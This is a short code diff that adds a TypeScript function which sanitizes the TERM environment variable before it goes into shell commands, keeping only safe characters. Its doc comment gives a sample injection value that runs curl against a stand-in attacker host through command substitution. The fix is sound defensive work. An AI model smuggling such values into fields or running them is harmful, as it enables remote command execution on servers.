@@ -195,3 +195,13 @@ export function defaultSpawnName(): string {
   const suffix = Math.random().toString(36).slice(2, 6);
   return `spawn-${suffix}`;
 }
+
+/** Sanitize TERM value before interpolating into shell commands.
+ *  SECURITY: Prevents shell injection via malicious TERM env vars
+ *  (e.g., TERM='$(curl attacker.com)' would execute on the remote server). */
+export function sanitizeTermValue(term: string): string {
+  if (/^[a-zA-Z0-9._-]+$/.test(term)) {
+    return term;
+  }
+  return "xterm-256color";
+}
